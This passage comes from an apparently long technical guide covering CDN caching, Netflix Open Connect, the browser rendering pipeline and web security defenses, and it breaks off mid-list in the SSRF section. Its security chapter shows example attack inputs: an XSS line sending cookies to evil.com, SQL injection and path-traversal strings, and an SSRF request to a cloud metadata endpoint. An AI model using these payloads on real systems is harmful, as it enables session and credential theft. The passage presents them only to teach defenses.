   Cache HIT → served from Tokyo edge → 5ms ✓
```

#### Cache Key

The CDN identifies what to cache using a **cache key** — typically the URL:

```
https://cdn.netflix.com/video/12345/chunk001.mp4
Cache key: /video/12345/chunk001.mp4

Same URL from different users → same cache key → same cached response ✓
Different URLs → different cache entries
```

**Vary header** extends the cache key with request headers:
```
Response: Vary: Accept-Encoding
Cache key becomes: /static/app.js + Accept-Encoding: br
               or: /static/app.js + Accept-Encoding: gzip
(Two separate cached copies — one per encoding)
```

---

### Cache-Control and TTL

The origin server controls how long CDN caches a resource via `Cache-Control` headers:

```
Cache-Control: public, max-age=31536000, immutable
               ↑        ↑                 ↑
       Anyone can cache  1 year TTL     Never revalidate
       (CDN, browser)

Use for: /static/app.abc123.js  (hash in filename = content-addressed)
         If content changes, the filename changes — old URL can stay cached
         until its long TTL expires.

Cache-Control: no-store
Use for: / (home page — personalized, never cache)
         /api/users/me  (user-specific data)

Cache-Control: public, s-maxage=3600, max-age=0
               ↑              ↑           ↑
       CDN can cache  CDN caches 1hr  Browser: don't cache
       s-maxage is for shared caches (CDN).
       max-age is for private caches (browser).
```

---

### CDN Cache Invalidation

A cached file has a TTL. What if you need to invalidate it before TTL expires?

```
Scenario: You deployed a bug fix in app.js but cached version is served for 24hrs.

Solutions:

1. Content-addressed filenames (best):
   app.abc123.js → app.def456.js  (new hash = new URL = new cache entry)
   Old URL expires naturally. New URL has no cached version → cache miss → fresh.
   Zero invalidation needed.

2. CDN API purge:
   POST /cdn-api/purge  {"paths": ["/static/app.js"]}
   CDN removes from all POPs immediately.
   Useful for urgent security fixes.

3. Surrogate keys / cache tags:
   Response header: Cache-Tag: product-12345, category-electronics
   Purge all resources tagged "product-12345" with one API call.
   Cloudflare, Fastly, and Akamai support this.

4. Version query strings:
   /app.js?v=2  (different URL = different cache entry)
   Old: /app.js?v=1  (cached, expires naturally)
   New: /app.js?v=2  (fresh, cache miss initially)
```

---

### Netflix Open Connect (OCA)

Netflix operates their own CDN called **Open Connect** with custom-built **OCA (Open Connect Appliances)** — physical servers installed directly inside ISP networks worldwide.

#### Why Netflix Built Their Own CDN

Netflix has historically represented a large share of downstream internet
traffic in many reports. Third-party CDN costs at that scale would be enormous.
Open Connect lets Netflix:
- Control the hardware (optimized for video streaming)
- Negotiate free peering with ISPs (mutual benefit — ISPs don't pay transit for Netflix traffic)
- Pre-position content proactively (fill servers during off-peak hours)

#### How Netflix OCA Works

```
Netflix OCA Architecture:
                    Netflix HQ (LA/Oregon)
                    Origin + Management Plane
                           │
                    BGP + Control Plane
                    ┌──────┼──────┐
                    │      │      │
              ┌─────┘  ┌───┘  ┌──┘
              │        │      │
         ┌────▼──┐ ┌───▼──┐ ┌▼──────┐
         │ Comcast│ │ AT&T │ │ Tata  │
         │ IXP   │ │ IXP  │ │ Mumbai│
         │ OCA   │ │ OCA  │ │ OCA   │
         └───────┘ └──────┘ └───────┘
              ↑         ↑         ↑
         Physically     Physically  Physically
         installed in   installed   installed in
         Comcast's DC   in AT&T's   Tata's DC
                        network     (Mumbai)

User in Mumbai → Tata network → OCA at Tata Mumbai → video served locally
Never leaves Tata's network. No transit cost. Ultra-low latency.
```

#### OCA Content Fill Strategy

OCA servers are filled **proactively** during off-peak hours (3–6 AM local time) using Netflix's proprietary **proactive caching**:

```
Netflix's data team predicts: "Squid Game Season 3 will be top 10 in India tomorrow"
Night before release:
  Netflix fills all India OCAs with Squid Game S3 (all quality levels)

Day of release:
  User in India: GET /video/squid-game-s3-ep1/4k/chunk001
  OCA in India: HIT → serves from local storage
  0 bytes travel from US to India ✓
```

---

### Push vs Pull CDN

#### Pull CDN (most common)

CDN pulls content from origin on first request (cache miss). Content is fetched on-demand.

```
First request: CDN → Origin (slow)
Subsequent requests: CDN cache → User (fast)
```

Good for: unknown access patterns, large catalogs, long-tail content.

#### Push CDN

Content is proactively pushed to CDN by the origin — before any user requests it.

```
You upload a new movie to Netflix:
  Netflix push → all CDN/OCA POPs worldwide receive the file
  First user request: already cached → fast ✓
```

Good for: predictable popular content, time-sensitive launches.
Netflix has described proactive content placement for popular titles as a core
part of Open Connect's design.

---

### CDN and TLS

CDN providers hold your TLS certificate and serve your users. Two models:

**1. Shared certificate (multi-tenant CDN):**
```
CDN presents a cert for *.cdn-provider.com
Your content served from cdn1234.cloudfront.net
Users see Cloudfront's cert, not your cert.
```

**2. Custom domain + cert:**
```
CDN serves: https://cdn.netflix.com
CDN holds netflix.com wildcard certificate ✓
Users see netflix.com cert — seamless.
Netflix uploads their cert to CDN (or CDN uses Let's Encrypt / ACM automatically).
```

**3. Keyless SSL:**
```
CDN doesn't hold your private key.
During TLS handshake, CDN sends key operations to your origin key server.
Your private key operation stays under your control instead of being uploaded
to the CDN.
Cloudflare offers this ("Keyless SSL").
```

---

### CDN for APIs vs Static Assets vs Video

| Content Type | Caching Strategy | TTL | Invalidation |
|---|---|---|---|
| HTML (personalized) | No-cache | 0 | N/A |
| HTML (generic page) | Short cache | 1–60s | Purge on deploy |
| JS/CSS (hashed) | Long cache | 1 year | Never (new filename) |
| Images (versioned) | Long cache | 1 year | Never (new filename) |
| Images (mutable) | Short cache | 1hr | Purge on update |
| API responses (public) | Short cache | 10–60s | Purge on write |
| API responses (private) | No shared cache | 0 | N/A |
| Video chunks (static) | Very long | 30 days–1 year | Never |
| Live stream segments | Very short | 2–6 seconds | N/A (ephemeral) |

---

### Across the series

- **Build a CDN edge** that implements `Cache-Control`, `Vary`, ETag
  revalidation, and `stale-while-revalidate`, and watch every decision it
  makes: `edgecache` in [Chapter 15](#chapter-15-cache-correctness-browser-cdn-proxy-and-application-caches).
- **Anycast and BGP**, the routing that sends you to the nearest edge:
  [TCP/IP guide, Chapter 50](../networking/tcp-ip/real-life-guide-v1.md#chapter-50-bgp-how-the-whole-internet-agrees-on-directions).

### Key Takeaways

- CDNs cache content at **edge servers near users** to reduce latency and origin load.
- **Cache HIT**: served from edge in milliseconds. **Cache MISS**: fetched from origin, cached for future.
- **Cache-Control headers** set by origin control how long CDN caches resources.
- Use **content-addressed filenames** (hash in URL) for long-lived caching without invalidation headaches.
- Netflix's **Open Connect (OCA)** is their proprietary CDN — physical servers inside ISP networks, free to ISPs.
- OCA uses **proactive push** — popular content is pre-positioned before users request it.
- **CDN cache invalidation** options: URL versioning (best), API purge, cache tags.
- CDNs hold your TLS certificates — choose providers you trust. Keyless SSL lets CDN terminate TLS without holding your private key.

---

# Part 6 — From bytes to pixels

Every part until now was about getting bytes from Netflix's servers to your
machine. This part is the last mile: what your browser does with those
bytes once they arrive, from the first byte of HTML to a fully painted,
interactive screen.

## Chapter 11 — Browser Rendering: From Bytes to Pixels

> The browser received the HTML from Netflix. Now it has to turn those bytes into the page you see on screen. This is one of the most complex pipelines in software engineering.

---

### The Simple Version (5-year-old)

Imagine you receive a set of LEGO instructions (HTML). Before you can build:

1. **Read the instructions** (parse HTML → DOM tree — know what pieces you have).
2. **Check the color guide** (parse CSS → CSSOM — know how each piece should look).
3. **Plan what to build** (Render Tree — combine structure + style, ignore hidden pieces).
4. **Figure out where each piece goes** (Layout — calculate position and size).
5. **Paint it** (Paint — fill in colors, draw text, add images).
6. **Put it on display** (Composite — GPU assembles final picture, shows it on screen).

Each step must happen before the next. This is the **critical rendering path**.

---

### The Critical Rendering Path

```
HTML bytes arrive (compressed, encrypted)
        │
        ▼ 1. Decode
Decompressed UTF-8 HTML text
        │
        ▼ 2. Parse HTML
DOM Tree (Document Object Model)
        │
        ├──────────────────────────────────────────┐
        │ (parallel: discover CSS links, JS files) │
        ▼ 3. Parse CSS                             │
CSSOM Tree (CSS Object Model)                      │
        │                                          │
        ▼ 4. Combine                               ▼ 5. Download + Execute
Render Tree                                        JavaScript
(DOM + CSSOM, visible nodes only)                  (modifies DOM/CSSOM)
        │
        ▼ 6. Layout (Reflow)
Geometry: position and size of every element
        │
        ▼ 7. Paint
Pixel instructions: what color, text, images at each pixel
        │
        ▼ 8. Composite
GPU assembles layers into the final frame
        │
        ▼
Screen (60fps = new frame every 16.67ms)
```

---

### Step 1: Receiving and Decoding

HTML arrives in chunks (streamed). Browser starts parsing as bytes arrive — it does not wait for the full page.

```
Bytes received: [TLS decrypt] → [Brotli decompress] → [UTF-8 decode]
  e.g.: 0xEF 0xBB 0xBF ... → <html><head><title>Netflix</title>...
```

**Streaming parse advantage:** Browser can discover `<link rel="stylesheet">` and `<script>` tags early and begin downloading CSS/JS while HTML is still arriving.

---

### Step 2: Parsing HTML → DOM Tree

The **DOM (Document Object Model)** is a tree representation of the HTML structure.

```html
<html>
  <head>
    <title>Netflix</title>
    <link rel="stylesheet" href="/style.css">
  </head>
  <body>
    <nav id="header">
      <img src="/logo.png" alt="Netflix">
    </nav>
    <main>
      <h1>Watch anywhere.</h1>
    </main>
  </body>
</html>
```

Becomes:

```
Document
└── html
    ├── head
    │   ├── title: "Netflix"
    │   └── link (stylesheet: /style.css)
    └── body
        ├── nav#header
        │   └── img (src: /logo.png)
        └── main
            └── h1: "Watch anywhere."
```

#### Parser Blocking — The Most Important Performance Rule

The HTML parser **blocks** (stops) when it encounters a `<script>` tag without `async` or `defer`:

```html
<head>
  <script src="/analytics.js"></script>  ← Parser STOPS here
  ...                                    ← This HTML is not parsed until script finishes
</head>

Why? JS can call document.write() which modifies HTML.
     Parser must let JS run before continuing.

This is why render-blocking scripts are bad for performance.
```

**Solution — `async` and `defer`:**

```html
<script src="/analytics.js" async></script>
  → Downloaded in parallel. Executed whenever downloaded (may be before/after DOM ready).
  → Does not block parsing. Good for independent scripts (analytics, ads).

<script src="/app.js" defer></script>
  → Downloaded in parallel. Executed AFTER HTML is fully parsed.
  → Does not block parsing. Good for scripts that need the full DOM.
  → Executed in order of appearance (unlike async).

<script type="module" src="/app.js"></script>
  → Implicitly deferred. Supports ES module imports.
```

**CSS also blocks rendering** (but not parsing):
```
<link rel="stylesheet" href="/style.css">
  CSS must be fully downloaded and parsed before any rendering happens.
  Why: rendering without CSS would show unstyled content, then flash to styled = bad UX.
  (This is called FOUC — Flash Of Unstyled Content)
```

---

### Step 3: Parsing CSS → CSSOM

The **CSSOM (CSS Object Model)** is the CSS equivalent of the DOM — a tree of style rules.

```css
body { font-size: 16px; color: #333; }
nav  { background: #e50914; }
h1   { font-size: 2rem; font-weight: bold; }
```

CSSOM represents computed styles for each element:

```
CSSOM:
  body: { font-size: 16px, color: #333 }
  nav:  { background: #e50914 }
  h1:   { font-size: 32px (2rem × 16px base), font-weight: bold }
```

CSS specificity and cascade rules are applied during CSSOM construction. Child elements inherit parent styles.

---

### Step 4: Building the Render Tree

The **Render Tree** combines DOM + CSSOM. It contains only **visible** nodes with their computed styles.

```
DOM Node                   CSSOM Rule           Render Tree Node?
<html>                     -                    Yes (container)
<head>                     display:none(implicit) NO
<title>                    -                    NO (head is hidden)
<body>                     display:block        Yes
<nav>                      display:flex         Yes + styles applied
<img>                      display:inline       Yes + styles applied
<script>                   -                    NO (not visual)
<div style="display:none"> display:none         NO (explicitly hidden)
```

Nodes with `display: none` are excluded. Nodes with `visibility: hidden` ARE included (they take up space, but paint as invisible).

---

### Step 5: Layout (Reflow)

**Layout** (also called **Reflow**) calculates the exact position and size of every node in the render tree.

```
Browser viewport: 1440px wide × 900px tall

Compute for each element:
  body:  x=0, y=0, width=1440, height=900
  nav:   x=0, y=0, width=1440, height=64
  img:   x=16, y=12, width=92, height=40
  main:  x=0, y=64, width=1440, height=836
  h1:    x=120, y=200, width=1200, height=48
```

Layout is **expensive**. Changing an element's geometry (width, height, position) can force the browser to recalculate the geometry of ALL other elements — this cascades.

**What triggers layout:**
- Changing `width`, `height`, `padding`, `margin`, `position`, `font-size`, `display`
- Adding/removing DOM elements
- Reading layout properties (`offsetWidth`, `getBoundingClientRect()`) — browser must flush pending layouts to give accurate values
- Resizing the window

**Avoid layout thrashing:**
```javascript
// BAD — triggers layout 1000 times
for (let i = 0; i < 1000; i++) {
  element.style.width = element.offsetWidth + 1 + 'px'; // read then write → layout!
}

// GOOD — batch reads, then writes
const width = element.offsetWidth; // read once
for (let i = 0; i < 1000; i++) {
  element.style.width = (width + i) + 'px'; // write without reading
}
```

---

### Step 6: Paint

**Paint** is converting the render tree into actual pixel instructions.

```
Paint operations recorded (not executed yet — this is a "paint list"):
  - Fill rectangle (0, 0, 1440, 64) with color #e50914  (nav background)
  - Draw image at (16, 12, 92, 40)  (Netflix logo)
  - Draw text "Watch anywhere." at (120, 200) in font 32px bold #fff
  - Draw rectangle border (1, solid, #ccc) at (0, 64, 1440, 1)
  ...
```

Paint is done **per layer**. Browser creates multiple layers for efficiency:
- Static content (background, text) — one layer
- Animated elements — separate layers (GPU handles animation without repainting)
- Fixed-position elements (sticky nav) — separate layer (scrolls independently)

**What triggers paint:**
- Changing `color`, `background`, `border`, `box-shadow`, `opacity`
- Layout changes (always trigger paint too)

---

### Step 7: Composite

**Compositing** is the GPU's job: take all the painted layers and assemble them into the final frame.

```
Layer 1: Background + content (painted by CPU)
Layer 2: Netflix logo (image)
Layer 3: Fixed header (separate layer — doesn't repaint on scroll)
Layer 4: Video player overlay
Layer 5: Modal dialog (if open)

GPU composites all layers → final frame → displayed on screen
```

**Why separate layers help performance:**
- Animations on their own layer (`transform`, `opacity`) only trigger **composite** — no layout, no paint. GPU handles it at 60fps with no CPU involvement.

**Promoting an element to its own layer:**
```css
/* Tells browser: put this on its own GPU layer */
.animated-element {
    will-change: transform;  /* modern, explicit hint */
    transform: translateZ(0); /* old trick — also creates layer */
}
```

**Danger:** Too many layers = too much GPU memory. Only promote elements that genuinely need it.

---

### JavaScript and the Main Thread

The browser has one **main thread** that handles:
- HTML parsing
- JavaScript execution
- CSS parsing
- Layout
- Paint

If JS runs for more than 16ms (one frame), the browser cannot render a new frame → **janky animation** or **unresponsive UI**.

```
Main thread timeline:
 [Parse HTML] [CSS] [JS runs 200ms!] [Layout] [Paint] [Composite]
                     ↑
              During these 200ms: no rendering, no user input handled
              Page appears frozen to user
```

**Solutions:**

```javascript
// Move heavy work off the main thread using Web Workers
const worker = new Worker('/heavy-computation.js');
worker.postMessage({ data: largeDataset });
worker.onmessage = (e) => updateUI(e.data);
// Main thread free to render while worker computes

// Break up long tasks using setTimeout/requestAnimationFrame
function processChunk(items, start) {
    const end = Math.min(start + 50, items.length);
    for (let i = start; i < end; i++) {
        processItem(items[i]);
    }
    if (end < items.length) {
        requestAnimationFrame(() => processChunk(items, end)); // yield to browser
    }
}
```

---

### Core Web Vitals

Google's metrics for measuring real-user page experience. Netflix engineers optimize for these:

#### LCP — Largest Contentful Paint

Time until the **largest visible element** (hero image, headline) is rendered.

```
Good:    < 2.5s
Needs improvement: 2.5s–4.0s
Poor:    > 4.0s

How to improve LCP:
  • Preload the hero image: <link rel="preload" href="/hero.jpg" as="image">
  • Use a CDN (image served from nearby edge)
  • Server-Side Rendering (HTML arrives with content, not shell)
  • Optimize image format (WebP, AVIF = 50% smaller than JPEG)
  • Inline critical CSS (no render-blocking CSS file fetch)
```

#### CLS — Cumulative Layout Shift

Total **unexpected layout shift** during the page's life. Measures visual stability.

```
Good:    < 0.1
Needs improvement: 0.1–0.25
Poor:    > 0.25

Common causes:
  • Images without width/height attributes (browser doesn't know size until loaded → shifts content)
  • Web fonts loading (text reflows when font loads)
  • Ads loading and expanding

Fix:
  <img src="/logo.png" width="92" height="40">  (reserve space before image loads)
  font-display: swap;  (show fallback font, swap when web font loads — may shift)
  font-display: optional;  (use web font only if already cached — no shift)
```

#### INP — Interaction to Next Paint

Time from a user's interaction (click, tap, keypress) to the next visible
browser response. INP replaced First Input Delay (FID) as a Core Web Vital in
March 2024 because it captures responsiveness across the page's interactions,
not only the first one.

```
Good:    ≤ 200ms
Needs improvement: 200ms–500ms
Poor:    > 500ms

Caused by: JS blocking the main thread
Fix: Break up long tasks, use Web Workers, reduce JS bundle size
```

#### TTFB — Time to First Byte

Time from request sent to first byte of response received. Measures server speed.

```
Good: < 200ms

Includes:
  DNS lookup + TCP handshake + TLS handshake + server processing

Optimize with:
  • Use a CDN (edge server is nearby)
  • Server-side caching (Redis, Memcached)
  • Efficient database queries
  • SSR with streaming (send HTML as soon as first chunk is ready)
```

---

### Resource Hints — Telling the Browser What's Coming

```html
<!-- Preload: fetch this now, high priority, you'll definitely need it -->
<link rel="preload" href="/hero.jpg" as="image">
<link rel="preload" href="/critical.css" as="style">
<link rel="preload" href="/font.woff2" as="font" crossorigin>

<!-- Prefetch: fetch this soon, low priority, next navigation probably needs it -->
<link rel="prefetch" href="/next-page.html">
<link rel="prefetch" href="/video/trailer.mp4">

<!-- Preconnect: open TCP+TLS connection to this origin now, don't fetch yet -->
<link rel="preconnect" href="https://api.netflix.com">
<link rel="preconnect" href="https://cdn.nflxvideo.net">

<!-- DNS-prefetch: resolve DNS for this domain now (weaker than preconnect) -->
<link rel="dns-prefetch" href="//api.netflix.com">
```

---

### Service Workers — Offline and Caching

A **Service Worker** is a JavaScript file that runs in a background thread and intercepts all network requests.

```
Browser request lifecycle with Service Worker:

Browser → [SW intercepts] → Cache? HIT → return from cache (0ms)
                                  MISS → fetch from network → cache → return

Use cases:
  • Offline support: serve cached content when network is unavailable
  • Background sync: queue writes when offline, send when online
  • Push notifications: receive server push even when app is closed
  • Precaching: download assets proactively during install
  • Request rewriting: modify requests (add auth headers, change URLs)
```

---

### Across the series

- **The network half of page speed** (DNS, TCP, TLS, and TTFB) is measured
  phase by phase by the `httptrace` lab in [Chapter 17](#chapter-17-debugging-the-lifecycle-browser-devtools-curl-openssl-packet-capture-and-logs).
  A reused connection cut a request from 1,223 ms to 54 ms in testing.
- **Why latency has a physical floor**, and why "deploy closer to users"
  matters more than optimising code: [OSI guide, Layer 1](../networking/real-life-example-osi.md#part-3-layer-1-physical).

### Key Takeaways

- The critical rendering path: HTML → DOM → (+ CSS → CSSOM) → Render Tree → Layout → Paint → Composite.
- **Parser-blocking scripts** (`<script>`) halt HTML parsing — use `defer` or `async`.
- **CSS is render-blocking** — it must be downloaded before the browser paints anything.
- **Layout (reflow)** calculates geometry — expensive, cascades to all elements. Avoid forcing it in loops.
- **Paint** converts the render tree to pixel instructions per layer.
- **Composite** is GPU work — transforms and opacity animations skip layout and paint entirely.
- Keep JS off the main thread — use Web Workers for CPU-heavy tasks.
- Target: new frame every 16.67ms (60fps). Any JS over 16ms causes jank.
- **Core Web Vitals**: LCP (content visible), CLS (layout stable), INP (responsive to input).
- **Resource hints** (`preload`, `preconnect`, `prefetch`) tell the browser what to fetch ahead of time.

---

# Part 7 — Keeping it safe and observable

Two closing concerns that cut across everything in Parts 1–6 rather than
adding a new stage to the request. Chapter 12 is the attack surface at every
layer you've just learned, and the specific defense for each. Chapter 13 is
how a network team actually watches and steers all of this traffic once
it's running in production — continuously, not just once.

## Chapter 12 — Security: Protecting the Entire Lifecycle

> Every phase of the HTTP lifecycle is an attack surface. This guide covers what can go wrong at each point and how Netflix (and you) defend against it.

---

### The Simple Version (5-year-old)

Imagine mailing a secret letter to Netflix:

- **Envelope** (TLS) — so nobody can read it on the way.
- **Wax seal** (authenticated encryption tag) — so tampering is detected.
- **ID card** (certificate) — so you know it's really Netflix and not someone pretending.
- **Secret code word** (authentication) — so Netflix knows it's really you.
- **Bouncer at the door** (firewall/WAF) — who checks everyone entering.
- **Alarm system** (monitoring/SIEM) — alerts if something suspicious happens.

Security is **layers of defense** — no single mechanism is enough. Each layer catches what the previous one misses.

---

### 1. Transport Security — TLS

Already covered in Chapter 4 (TLS & HTTPS). Quick summary of what it defends against:

| Attack | How TLS Defends |
|---|---|
| Eavesdropping | Negotiated encryption such as AES-GCM or ChaCha20-Poly1305 — intercept but cannot read plaintext |
| Tampering | Authenticated encryption detects modified records |
| Impersonation | Certificate chain — proves server is who it claims to be |
| Downgrade attacks | TLS 1.3 Finished message — any tampering detected; HSTS prevents HTTP fallback |
| MITM | Certificate validation + HSTS + Certificate Transparency monitoring + CAA |

---

### 2. HSTS — HTTP Strict Transport Security

**Problem:** You type `netflix.com` (no `https://`). Browser tries `http://netflix.com` first. An attacker could intercept this first HTTP request and redirect you to a fake site.

**HSTS** tells the browser: "Never use HTTP for this domain — always use HTTPS, for the next [max-age] seconds."

```http
Response header:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

max-age=31536000    → remember this for 1 year
includeSubDomains   → applies to api.netflix.com, cdn.netflix.com too
preload             → submit to browser's built-in HSTS preload list
```

#### HSTS Preload List

A browser-shipped list of domains that should use HTTPS from the very first
visit, before any ordinary HTTP request is made. Preloading is powerful but
operationally serious: if you preload a domain and later break HTTPS for a
subdomain, users may be unable to reach it until you fix TLS or complete a slow
removal process.

```
First visit WITHOUT HSTS:
  1. Browser → http://netflix.com (plain HTTP)
  2. Netflix → 301 Redirect to https://netflix.com
  3. Attacker could intercept step 1!

First visit WITH HSTS preload:
  1. Browser checks hardcoded list: netflix.com → HTTPS only
  2. Browser → https://netflix.com (directly, no ordinary HTTP first hop)
  3. Attacker loses the easy first-visit HTTP downgrade window ✓
```

---

### 3. Content Security Policy (CSP)

**Problem:** XSS (Cross-Site Scripting) — attacker injects malicious JavaScript into your page. The injected JS runs with full access to cookies, DOM, and can send data to attackers.

**CSP** is a response header that tells the browser: "Only execute scripts from these trusted sources."

```http
Content-Security-Policy:
  default-src 'self';
  script-src  'self' https://cdn.nflxvideo.net 'nonce-abc123xyz';
  style-src   'self' 'unsafe-inline';
  img-src     'self' data: https://nflximg.net;
  connect-src 'self' https://api.netflix.com wss://push.netflix.com;
  font-src    'self' https://nflxvideo.net;
  frame-ancestors 'none';
  upgrade-insecure-requests;
```

**How CSP blocks XSS:**

```html
<!-- Attacker injects this script via a comment field or URL parameter: -->
<script src="https://evil.com/steal-cookies.js"></script>

<!-- Browser checks: is evil.com in script-src? NO → BLOCKED ✓ -->

<!-- What about inline scripts? -->
<script>stealCookies()</script>
<!-- Blocked unless 'unsafe-inline' or matching nonce is present -->

<!-- With nonce-based CSP: -->
<!-- Server adds nonce to legitimate scripts: -->
<script nonce="abc123xyz">legitCode()</script>
<!-- Attacker cannot know the server-generated nonce → cannot inject with valid nonce -->
```

**CSP Violation Reporting:**

```http
Content-Security-Policy: ...; report-uri https://csp-reports.netflix.com
```

Browser sends a JSON report to the URI when a CSP violation occurs. Netflix can detect ongoing injection attacks in real-time.

---

### 4. CORS — Cross-Origin Resource Sharing

**Problem:** A malicious site `evil.com` loads in your browser. It makes a `fetch()` call to `https://api.netflix.com/users/me` — and since you're logged in, this would succeed and send your data to `evil.com`.

**Same-Origin Policy** blocks this by default. **CORS** is the mechanism to selectively allow trusted cross-origin access.

```
evil.com tries: fetch('https://api.netflix.com/users/me')
Browser sends preflight: OPTIONS /users/me
  Origin: https://evil.com

api.netflix.com responds:
  Access-Control-Allow-Origin: https://www.netflix.com   ← only this origin allowed
  (evil.com is NOT listed)

Browser: "Origin evil.com is not allowed. Blocking response." ✓
The request DID reach the server — CORS is browser-enforced, not server-enforced.
(Server-side: validate Origin header too, for defense-in-depth)
```

---

### 5. Cookies — Secure Storage of Session State

Cookies are the primary way browsers maintain session state. Misconfigured cookies are a major attack vector.

```http
Set-Cookie: sessionId=abc123;
  Secure;          ← Only sent over HTTPS (never HTTP — prevents interception)
  HttpOnly;        ← JavaScript cannot read this cookie (document.cookie blocked)
                     Prevents XSS from stealing session tokens
  SameSite=Strict; ← Cookie not sent on any cross-site request
                     Strongest CSRF protection
  Domain=.netflix.com;  ← Sent to all netflix.com subdomains
  Path=/;
  Max-Age=3600;    ← Expires in 1 hour
```

#### SameSite Values — CSRF Protection

| SameSite | Sent on cross-site navigation? | Sent on cross-site fetch? | Use case |
|---|---|---|---|
| `Strict` | No | No | Maximum CSRF protection. May break legitimate flows (OAuth redirects) |
| `Lax` | Yes (top-level GET only) | No | Good default. Allows "link from google → netflix" |
| `None` | Yes | Yes | Required for embedded content (iframes, widgets). Must have `Secure` |

#### CSRF — Cross-Site Request Forgery

```
Without SameSite protection:
  1. You're logged into netflix.com (cookie in browser).
  2. You visit evil.com.
  3. evil.com has hidden form: <form action="https://netflix.com/account/delete" method="POST">
  4. Form auto-submits. Browser sends POST with your netflix.com cookie.
  5. Netflix deletes your account — attacker's request, your cookie!

With SameSite=Strict:
  Step 4: Browser sees cross-site POST. Cookie has SameSite=Strict.
           Cookie NOT sent. Request arrives without auth → rejected. ✓
```

---

### 6. X-Frame-Options & Clickjacking

**Clickjacking:** Attacker embeds Netflix in a transparent iframe, overlays a fake UI. You think you're clicking "Win a Prize!" but you're actually clicking Netflix's "Buy Premium Subscription."

```http
X-Frame-Options: DENY
  → This page cannot be embedded in ANY iframe

X-Frame-Options: SAMEORIGIN
  → Only same-origin iframes allowed

Content-Security-Policy: frame-ancestors 'none';
  → Modern equivalent (CSP frame-ancestors supersedes X-Frame-Options)
  → More flexible: can specify allowed origins explicitly
```

---

### 7. Certificates & PKI Security

#### Certificate Transparency (CT)

Publicly trusted TLS certificates are expected to appear in **public,
append-only Certificate Transparency logs**. Major browsers require proof of CT
logging (usually via embedded or stapled SCTs — Signed Certificate Timestamps)
before trusting many certificate types.

```
Why this matters:
  A rogue CA issues a cert for netflix.com to an attacker.
  This cert MUST be logged in CT.
  Netflix monitors CT logs for any cert issued for *.netflix.com.
  Netflix detects the rogue cert within minutes.
  Netflix contacts the CA to revoke it.
  Netflix can also use CAA records to prevent unauthorized issuance.
```

#### CAA — Certification Authority Authorization

A DNS record specifying which CAs are allowed to issue certs for your domain:

```
netflix.com CAA 0 issue "digicert.com"
netflix.com CAA 0 issuewild "digicert.com"
netflix.com CAA 0 iodef "mailto:security@netflix.com"
```

If a CA (Let's Encrypt, Comodo, etc.) receives a cert request for `netflix.com`, it must check CAA records first. If the CA isn't listed, it must refuse.

#### Certificate Revocation

If Netflix's private key is stolen, they need to revoke the cert immediately:

**CRL (Certificate Revocation List):**
```
CA publishes a list of revoked serial numbers at a URL.
Browser downloads and checks the list.
Problems: Large file, updated infrequently, browser caches stale versions.
```

**OCSP (Online Certificate Status Protocol):**
```
Browser makes real-time request to CA's OCSP responder:
  "Is cert serial 12345678 still valid?"
  CA responds: "Good" or "Revoked"
Problem: Latency (extra network request per HTTPS connection) + privacy (CA knows your browsing).
```

**OCSP Stapling (solution):**
```
Netflix's server fetches OCSP response from CA (cached for 24hrs).
Netflix includes ("staples") this response in the TLS handshake.
Browser gets freshness proof without extra request.
No latency. No privacy leak. ✓
```

**OCSP Must-Staple:**
```
Certificate extension that says: "If OCSP staple missing, refuse connection."
Prevents attacker from blocking OCSP responses to use a revoked cert.
```

---

### 8. Web Application Firewall (WAF)

A WAF sits between users and your web application, inspecting HTTP requests for known attack patterns.

```
Client → WAF → Reverse Proxy → App Server

WAF inspects (at L7):
  • SQL injection: ?id=1' OR '1'='1  → BLOCK
  • XSS: <script>alert(1)</script>   → BLOCK
  • Path traversal: /../etc/passwd   → BLOCK
  • Known CVE exploits               → BLOCK
  • Abnormal request rates           → BLOCK (rate limit)
  • Malformed HTTP                   → BLOCK
  • OWASP Top 10 attack patterns     → BLOCK
```

WAF rule types:
- **Signature-based:** Match known attack strings. Fast but misses novel attacks.
- **Anomaly-based:** Score requests on deviation from normal. Catches new attacks.
- **Rate-based:** Block IPs making too many requests.

---

### 9. Authentication & Authorization

**Authentication** = Who are you? (Verify identity)
**Authorization** = What are you allowed to do? (Verify permissions)

#### JWT — JSON Web Token

A large streaming service might use JWTs or a similar signed-token format for API authentication:

```
JWT structure (three Base64-encoded parts separated by dots):

Header:
{
  "alg": "RS256",     ← Signed with RSA-256
  "typ": "JWT"
}

Payload:
{
  "sub": "user-id-12345",
  "email": "user@example.com",
  "plan": "standard",
  "iat": 1714000000,   ← Issued at
  "exp": 1714003600    ← Expires at (+1 hour)
}

Signature:
RSASHA256(base64(header) + "." + base64(payload), privateKey)

Full JWT: eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyLWlkLTEyMzQ1In0.SIG...

Verification:
  1. Decode header and payload (anyone can do this — not encrypted, just encoded)
  2. Verify signature with Netflix's public key
  3. Verify exp hasn't passed
  4. Verify iss (issuer) and aud (audience) match expected values
  If all pass: user is authenticated ✓
```

**JWT sent as:** Cookie (HttpOnly, Secure) or `Authorization: Bearer <token>` header.

**JWT Security pitfalls:**
- Never store sensitive data in payload (it's base64, not encrypted — anyone can decode it).
- `alg: none` attack — always validate the `alg` field, reject "none".
- Short expiry + refresh tokens — if JWT is stolen, short TTL limits damage window.
- Rotate signing keys periodically.

---

### 10. Common Web Attacks — How They Work and How to Stop Them

#### SQL Injection

```
Vulnerable code:
  query = "SELECT * FROM users WHERE id = " + user_input;
  user_input = "1 OR 1=1 --"
  query = "SELECT * FROM users WHERE id = 1 OR 1=1 --"
  → Returns ALL users ✗

Defense: Parameterized queries / prepared statements:
  query = "SELECT * FROM users WHERE id = ?"
  execute(query, [user_input])
  → user_input treated as DATA, never as SQL code ✓
```

#### XSS — Cross-Site Scripting

```
Reflected XSS:
  Netflix search: ?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
  Page renders: <p>Results for <script>...</script></p>
  Script executes: steals your cookies → attacker logs in as you ✗

Defense:
  • Output encoding: render user input as text, not HTML
    <p>Results for {html_encode(query)}</p>
    → <p>Results for &lt;script&gt;...&lt;/script&gt;</p>
    (displayed as text, not executed)
  • CSP: even if rendered, blocked by CSP
  • HttpOnly cookies: even if XSS runs, can't read cookies
```

#### SSRF — Server-Side Request Forgery

```
Attack:
  Netflix has an endpoint: GET /preview?url=https://example.com
  Attacker: GET /preview?url=http://169.254.169.254/latest/meta-data/
  Server fetches AWS metadata endpoint → returns IAM credentials to attacker!

Defense:
  • Validate URL is an allowed external domain
